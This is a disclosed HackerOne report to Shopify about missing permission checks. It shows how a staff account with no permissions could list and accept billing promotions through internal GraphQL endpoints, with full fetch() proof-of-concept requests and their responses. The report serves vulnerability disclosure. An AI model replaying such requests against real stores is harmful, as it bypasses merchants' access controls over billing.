---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1044869'
original_report_id: '1044869'
title: Staff with no permissions could possibly list and accept billing promotions
weakness: Improper Access Control - Generic
team_handle: shopify
created_at: '2020-11-27T04:14:34.632Z'
disclosed_at: '2021-04-08T18:05:24.682Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# Staff with no permissions could possibly list and accept billing promotions

## Metadata

- HackerOne Report ID: 1044869
- Weakness: Improper Access Control - Generic
- Program: shopify
- Disclosed At: 2021-04-08T18:05:24.682Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

## Description
I was looking for undocumented GraphQL API endpoints and noticed a query and mutation related to what seems to be billing promotions, but I'm not 100% sure about this since I have no idea where those promotions would come from. However, since those GraphQL endpoints were found within the billing settings scope of the application, and that the staff I used to validate this had no permissions at all, I felt like there could be missing permissions check.

## Steps to reproduce

1. With a staff that has no permission, send this request to possibly list applicable promotions:

	```javascript
	fetch("https://{shop}.myshopify.com/admin/internal/web/graphql/core", {
	  "headers": {
		"accept": "application/json",
		"accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
		"content-type": "application/json",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"x-csrf-token": "{csrf-token}",
		"x-shopify-web-force-proxy": "1"
	  },
	  "referrerPolicy": "no-referrer",
	  "body": "{\"operationName\": \"Promotions\",\"query\": \"query Promotions {\\n shop {\\n  id\\n  applicablePromotions {\\n   id\\n   amount {\\n    amount\\n    currencyCode\\n    __typename\\n   }\\n   endAt\\n   description\\n   creditCategory\\n   promotionType\\n   __typename\\n  }\\n  __typename\\n }\\n}\"}",
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
	```
 1.2. The response returned by this request looks like the following:

	```json
	{
	  "data": {
		"shop": {
		  "id": "gid:\\/\\/shopify\\/Shop\\/45677445142",
		  "applicablePromotions": [],
		  "__typename": "Shop"
		}
	  },
	  "extensions": {
		"cost": {
		  "requestedQueryCost": 2,
		  "actualQueryCost": 2,
		  "throttleStatus": {
			"maximumAvailable": 10000,
			"currentlyAvailable": 9998,
			"restoreRate": 500
		  }
		}
	  }
	}
	```

2. Now, taking into consideration that the list would have return all the applicable promotions, the staff could possible accept a promotion by sending the following GrapQL request:

	```javascript
	fetch("https://{shop}.myshopify.com/admin/internal/web/graphql/core", {
	  "headers": {
		"accept": "application/json",
		"accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
		"content-type": "application/json",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"x-csrf-token": "{csrf-token}",,
		"x-shopify-web-force-proxy": "1"
	  },
	  "referrerPolicy": "no-referrer",
	  "body": "{\"operationName\": \"applicablePromotionAccept\",\"variables\": { \"id\": \"gid://shopify/ApplicablePromotion/{promotion_id}\"},\"query\": \"mutation applicablePromotionAccept($id: ID!) {\\n applicablePromotionAccept(id: $id) {\\n  userErrors {\\n   field\\n   message\\n   __typename\\n  }\\n  __typename\\n }\\n}\"}",
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
	```

 2.1. And the response returned by this request looks like the following:

```json
{
  "data": {
	"applicablePromotionAccept": {
	  "userErrors": [
		{
		  "field": null,
		  "message": "Promotion not found",
		  "__typename": "UserError"
		}
	  ],
	  "__typename": "ApplicablePromotionAcceptPayload"
	}
  },
  "extensions": {
	"cost": {
	  "requestedQueryCost": 10,
	  "actualQueryCost": 10,
	  "throttleStatus": {
		"maximumAvailable": 10000,
		"currentlyAvailable": 9990,
		"restoreRate": 500
	  }
	}
  }
}
```

 2.2. Looking at the previous response from the `applicablePromotionAccept` mutation, we can see that there was no privileges issues returned, which suggests that a staff could possibly accept the promotion if the specified ID was valid.

## Impact

A staff with no permission could possibly list and accept what I believe to be promotions related to the account billing due to improper access control.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
